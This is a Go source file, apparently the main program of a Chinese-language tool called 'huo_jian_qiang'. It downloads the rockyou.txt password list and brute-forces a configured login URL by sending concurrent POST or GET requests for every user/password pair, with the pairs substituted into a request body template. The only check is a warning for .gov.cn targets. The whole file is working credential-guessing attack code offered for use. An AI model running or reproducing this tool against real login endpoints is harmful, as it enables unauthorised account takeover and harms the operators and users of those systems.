package main

import (
	"bufio"
	"fmt"
	"huo_jian_qiang/cmd"
	"huo_jian_qiang/internal/download"
	"huo_jian_qiang/internal/logger"
	"huo_jian_qiang/internal/warning"
	"os"
	"strings"
	"sync"
	"time"

	http "huo_jian_qiang/internal/http"
)

func main() {
	cfg, err := cmd.ReadConfig()
	if err != nil {
		logger.Errorf("读取配置失败: %v", err)
		return
	}

	downloader := download.PasswordDownloader("downloads")

	if _, err := downloader.DownloadFile("https://github.com/ctkqiang/ZhiMing/releases/download/rockyou.txt/rockyou.txt"); err != nil {
		logger.Errorf("下载密码文件失败: %v", err)
		return
	}

	if err := download.CreateUsersTxt("."); err != nil {
		logger.Errorf("创建用户文件失败: %v", err)
		return
	}

	logger.Infof("-> 开始处理...")

	if strings.Contains(cfg.Url, ".gov.cn") {
		warningMsg, err := warning.DisplayWarning(cfg.Url)

		if err != nil {
			logger.Errorf("%s", warningMsg)
			os.Exit(0)
		}
	}

	if err := processFiles(cfg); err != nil {

		if strings.Contains(err.Error(), "no such file or directory") {
			logger.Errorf("用户文件不存在")
			return
		}

		logger.Errorf("处理文件失败: %v", err)

		return
	}
}

func processFiles(cfg *cmd.Config) error {
	users, err := readLines(cfg.UsersFile)
	if err != nil {
		return fmt.Errorf("读取用户文件失败: %v", err)
	}

	passwords, err := readLines(cfg.PasswordsFile)
	if err != nil {
		return fmt.Errorf("读取密码文件失败: %v", err)
	}

	var wg sync.WaitGroup
	semaphore := make(chan struct{}, cfg.Threads)

	for _, user := range users {
		for _, password := range passwords {
			wg.Add(1)
			semaphore <- struct{}{}

			go func(u, p string) {
				defer wg.Done()
				defer func() { <-semaphore }()

				if cfg.Delay > 0 {
					time.Sleep(time.Duration(cfg.Delay) * time.Second)
				}

				processRequest(cfg, u, p)
			}(user, password)
		}
	}

	wg.Wait()
	return nil
}

func readLines(filename string) ([]string, error) {
	file, err := os.Open(filename)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	var lines []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		lines = append(lines, scanner.Text())
	}
	return lines, scanner.Err()
}

func processRequest(cfg *cmd.Config, user, password string) {
	requestBody := cfg.RequestBody
	requestBody = strings.ReplaceAll(requestBody, "{user}", user)
	requestBody = strings.ReplaceAll(requestBody, "{pass}", password)

	var response string
	var statusCode int
	var err error

	switch strings.ToUpper(cfg.Method) {
	case "POST":
		response, statusCode, err = http.PostRequest(cfg.Url, requestBody, 30)
	case "GET":
		response, statusCode, err = http.GetRequest(cfg.Url, requestBody, 30)
	default:
		logger.Errorf("不支持的请求方法: %s", cfg.Method)
		return
	}

	if err != nil {
		logger.Errorf("-> 请求出错: %v", err)
		return
	}

	logger.Infof("-> 请求成功: 状态码=%d, 响应长度=%d", statusCode, len(response))
}
